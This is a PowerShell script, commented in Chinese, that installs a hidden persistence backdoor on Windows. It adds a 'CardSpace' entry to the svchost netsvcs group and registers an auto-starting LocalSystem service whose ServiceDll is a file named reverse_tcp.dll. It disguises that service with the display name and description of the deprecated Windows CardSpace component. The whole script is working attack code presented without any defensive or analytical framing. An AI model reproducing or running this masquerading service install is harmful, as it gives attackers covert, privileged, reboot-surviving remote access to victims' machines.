# 定义要添加的新值
$newValue = "CardSpace"

# 获取当前的多字符串值
$currentValue = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" -Name "netsvcs"

# 将新值添加到原有值的末尾
if ($currentValue -ne $null) {
    $currentValue.netsvcs += $newValue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" -Name "netsvcs" -Value $currentValue.netsvcs
}
# 创建 Windows CardSpace 服务
sc.exe create CardSpace binpath= "%SystemRoot%\system32\svchost.exe -k netsvcs" start= auto obj= LocalSystem

# 设置服务的 ServiceDll 注册表项
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\services\CardSpace\Parameters" -Name ServiceDll -Value "%SystemRoot%\System32\reverse_tcp.dll"

# 设置服务的 Description 注册表项
$description = "Windows CardSpace is a technology designed to provide secure identity authentication and credential management. It allows users to create and manage digital identities for secure access to online resources and authentication. Windows CardSpace helps protect users' personal information and credentials by offering trusted authentication methods. However, this technology has been deprecated in newer versions of Windows in favor of more modern identity authentication and credential management methods. Therefore, the Windows CardSpace service is no longer provided."
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\services\CardSpace" -Name Description -Value $description

# 设置服务的 DisplayName 注册表项
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\services\CardSpace" -Name DisplayName -Value "Windows CardSpace"

